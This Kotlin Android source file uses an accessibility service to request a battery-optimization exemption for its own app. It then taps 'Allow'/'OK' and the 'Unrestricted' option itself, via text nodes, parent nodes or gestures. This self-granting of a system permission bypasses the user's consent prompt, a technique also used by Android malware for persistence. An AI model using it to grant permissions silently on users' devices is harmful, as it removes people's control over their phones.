package com.storm.safe.rock.service.modules.yw5xud.generic

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger
import com.storm.safe.rock.service.modules.yw5xud.generic.GenericSteps.Companion.BATTERY_UNRESTRICTED_KEYWORDS

/**
 * GenericBattery — Battery optimization exemption.
 * Extracted from GenericSteps.executeBatteryOptimization + clickBatteryUnrestricted.
 *
 * Matches vendor b1/a5: check PowerManager.isIgnoringBatteryOptimizations,
 * launch ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS.
 */
class GenericBattery(
    private val service: MyAccessibilityService?,
    private val context: Context,
    private val ui: UiAutomation,
    private val steps: GenericSteps
) {
    companion object {
        private const val TAG = "GenericBattery"
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            if (ui.isBatteryOptimized()) {
                successes.add("电池优化已豁免")
                return
            }
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                         Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已发送电池优化豁免请求")

            steps.interruptibleDelay(2000L)
            steps.clickPermissionAllowButton()
            steps.interruptibleDelay(1000L)

            if (ui.isBatteryOptimized()) {
                successes.add("电池优化已豁免")
                return
            }

            steps.interruptibleDelay(800L)
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val allowKeywords = listOf("允许", "Allow", "确定", "OK", "好")
                for (keyword in allowKeywords) {
                    val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
                    if (nodes.isNullOrEmpty()) continue
                    for (node in nodes) {
                        if (node.isVisibleToUser && node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Log.i(TAG, "[电池优化] 降级点击: $keyword")
                            break
                        }
                    }
                }
            }

            steps.interruptibleDelay(1000L)
            if (ui.isBatteryOptimized()) {
                successes.add("电池优化已豁免")
            } else {
                // clickBattery fallback: try clicking "无限制" radio button via text + gesture
                clickBatteryUnrestricted()
                steps.interruptibleDelay(1000L)
                if (ui.isBatteryOptimized()) {
                    successes.add("电池优化已豁免")
                } else {
                    logs.add("电池优化豁免未确认")
                }
            }
        } catch (e: Exception) {
            failures.add("电池优化配置失败: ${e.message}")
        }
    }

    /**
     * Fallback: click "无限制" / "Unrestricted" radio button on battery settings page.
     * Searches by BATTERY_UNRESTRICTED_KEYWORDS, clicks via text node or gesture tap.
     */
    private fun clickBatteryUnrestricted() {
        UiDebugger.logStep(TAG, "Flow4: clickBatteryUnrestricted 开始")
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return
        UiDebugger.dumpPage(service, "generic_battery_page", "电池优化页面")
        for (keyword in BATTERY_UNRESTRICTED_KEYWORDS) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (!node.isVisibleToUser) continue
                val nodeText = node.text?.toString()?.trim() ?: ""
                if (nodeText != keyword && !nodeText.contains(keyword, ignoreCase = true)) continue
                // Direct click
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i(TAG, "[电池] 点击无限制: $keyword (直接)")
                    return
                }
                // Parent click
                val parent = try { node.parent } catch (_: Exception) { null }
                if (parent != null && parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i(TAG, "[电池] 点击无限制: $keyword (父节点)")
                    return
                }
                // Gesture fallback
                if (steps.dispatchGestureClick(node)) {
                    Log.i(TAG, "[电池] 点击无限制: $keyword (手势)")
                    return
                }
            }
        }
    }
}
